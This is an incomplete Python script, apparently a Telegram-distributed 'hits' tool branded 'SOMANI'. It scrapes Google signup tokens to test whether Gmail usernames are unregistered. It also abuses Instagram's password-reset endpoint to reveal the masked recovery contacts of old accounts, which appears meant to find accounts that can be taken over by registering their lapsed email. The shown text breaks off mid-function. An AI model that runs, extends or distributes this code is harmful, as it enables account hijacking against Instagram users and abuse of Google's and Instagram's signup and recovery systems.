from datetime import datetime, date
import sys

# Expiry date (31 Dec 2025)
EXPIRY_DATE = date(2026, 4, 4)

today = date.today()

print("🔒 Locked By @SOMANI")
print(f"📅 Valid Till : {EXPIRY_DATE.strftime('%d %B %Y')}")
print(f"📆 Today     : {today.strftime('%d %B %Y')}")
print("-" * 35)

if today <= EXPIRY_DATE:
    remaining_days = (EXPIRY_DATE - today).days
    print("✅ Status    : ACTIVE")
    print(f"⏳ Days Left : {remaining_days} day(s)")
else:
    print("❌ Status    : EXPIRED")
    print("🚫 This script is no longer valid.")
    sys.exit()        
import os
import time
from bs4 import BeautifulSoup
from rich.table import Table
import os
import signal
import datetime
from datetime import date
try:
  from rich.console import Console
  import requests
  from requests import get
except:
  os.system("pip install requests")
  import requests
  from requests import get
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
    import re
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent

try:
    import requests
    import time

    import random
    import faker
    import uuid
    import threading
    import time
except ImportError:
    os.system("pip install requests")
    os.system("pip install faker")

import requests
import time
from user_agent import generate_user_agent
import random
import faker
from faker import Faker
import uuid
from threading import Thread
import webbrowser
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
import os
from random import randrange

try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent

try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
from concurrent.futures import ThreadPoolExecutor 

# ========== Console ==========
console = Console()




O = '\x1b[38;5;208m'
R = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
B = '\033[2;36m'
K = '\033[2;35m'
C1 = '\033[2;35m'
B = '\033[2;36m'
Rn = "\033[0m"
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
DIM    = '\033[2m'
MAG    = '\033[95m'
WHITE  = '\033[97m'


import random
from threading import Lock
from cfonts import render

white = '\033[1;37m'
cyan = '\033[1;36m'
green = '\033[1;32m'
yellow = '\033[1;33m'
magenta = '\033[1;35m'
red = '\033[1;31m'
reset = '\033[0m'

color_combinations = [
    ['red', 'yellow'],
    ['blue', 'cyan'],
    ['green', 'white'],
    ['magenta', 'cyan'],
    ['yellow', 'red'],
    ['cyan', 'blue'],
    ['white', 'green'],
    ['red', 'white'],
    ['blue', 'magenta'],
    ['green', 'yellow']
]

random_colors = random.choice(color_combinations)
MAIN_TITLE = render(' SOMANI   ', colors=random_colors, align='center')
LOCKER=Lock()
USED=set()
print(MAIN_TITLE)

print(f"{' ' * 31}{cyan}TELEGRAM ➤  {white}@somani_07x")
print(f"{' ' * 31}{cyan}    JOIN ➤  {white}@somanieraa")
print(f"{' ' * 32}{cyan}  ADMIN ➤ {white} SOMANI  🤫      {reset}")
print(f"{' ' * 31}{cyan} VERSION ➤ {white} 69 🦅      {reset}")
print()



sh = f"""

{MAG}{BOLD}  ╭───────────── Select Year you want ─────────────╮            {RESET}

   {GREEN}     ①───── {RESET} {WHITE}2012{RESET} {DIM}{RESET}{GREEN}②───── {RESET} {WHITE}2013{RESET} {DIM}{RESET}{GREEN}③───── {RESET} {WHITE}2014{RESET}
           {DIM}{RESET}                 {DIM}{RESET}                 {DIM}{RESET}

   {GREEN}          ④───── {RESET} {WHITE}2015{RESET} {DIM}{RESET}{GREEN}⑤───── {RESET} {WHITE}2016{RESET} {DIM}{RESET}{GREEN}⑥───── {RESET} {WHITE}2017{RESET}
           {DIM}{RESET}                 {DIM}{RESET}                 {DIM}{RESET}

   {GREEN}     ⑦───── {RESET} {WHITE}2018{RESET} {DIM}{RESET}{GREEN}⑧───── {RESET} {WHITE}2019{RESET} {DIM}{RESET}{GREEN}⑨───── {RESET} {WHITE}2020{RESET}

{MAG} ╰───────────────────────────────────────────────╯             {RESET}

{CYAN}  𝑆𝑒𝑙𝑒𝑐𝑡 𝑌𝑒𝑎𝑟 𝑁𝑢𝑚𝑏𝑒𝑟→ {RESET}"""
print(sh)

ch = console.input("\n[cyan]  ➤➤  [/cyan]")
while ch not in ["1", "2", "3", "4","5","6","7","8","9"]:
    console.print("[red]❌ Invalid![/red]")
    ch = console.input("[cyan]  ➤➤ [/cyan]")

BLUE = "\033[94m"
RESET = "\033[0m"

def get_valid_input(text):
    while True:
        try:
            value = int(input(BLUE + text + RESET))
            if value > 20:
                print(BLUE + "Maximum allowed is 20 ❌\n" + RESET)
            else:
                return value
        except ValueError:
            print(BLUE + "Enter a valid number ❌\n" + RESET)

def start_tool():
    print(BLUE + "\n=== Tool Started ===" + RESET)
    print(BLUE + "Processing...\n" + RESET)
    print(BLUE + "Tool is running normally..." + RESET)

# Inputs
min_followers = get_valid_input("𝑀𝑖𝑛 𝑓𝑜𝑙𝑙𝑜𝑤𝑒𝑟: ")
min_posts = get_valid_input("𝑀𝑖𝑛 𝑝𝑜𝑠𝑡: ")

print(BLUE + "\nSettings Applied ✅" + RESET)
print(BLUE + f"𝑀𝑖𝑛 𝑓𝑜𝑙𝑙𝑜𝑤𝑒𝑟: {min_followers}" + RESET)
print(BLUE + f"𝑀𝑖𝑛 𝑝𝑜𝑠𝑡: {min_posts}" + RESET)

start_tool()


token = input(f"{GREEN}  𝘌𝘯𝘵𝘦𝘳 𝘉𝘰𝘵 𝘛𝘰𝘬𝘦𝘯 ➤➤ {RESET}")
ID = input(f" {GREEN} 𝘌𝘯𝘵𝘦𝘳 𝘊𝘩𝘢𝘵 𝘐𝘋 ➤➤ {RESET}").strip()




console = Console()
hits=0
bads_instgram=0
bads_email=0


from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def rest(user):
    headers = {
    "user-agent": user_agent.generate_user_agent(),
    "x-ig-app-id": "936619743392459",
    "x-requested-with": "XMLHttpRequest",
    "x-instagram-ajax": "1032099486",
    "x-csrftoken": "missing",
    "x-asbd-id": "359341",
    "origin": "https://www.instagram.com",
    "referer": "https://www.instagram.com/accounts/password/reset/",
    "accept-language": "en-US",
    "priority": "u=1, i",
}

    r = httpx.Client(http2=True, headers=headers, timeout=20).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": user}).json()

    try:
        body=r.get('body')
        rest = body.split("to ")[1].split(" with")[0]
        if rest:
                return rest
        else:
                return "No Rest"

    except:
        pass

def info(username,jj):
  global hits,ch
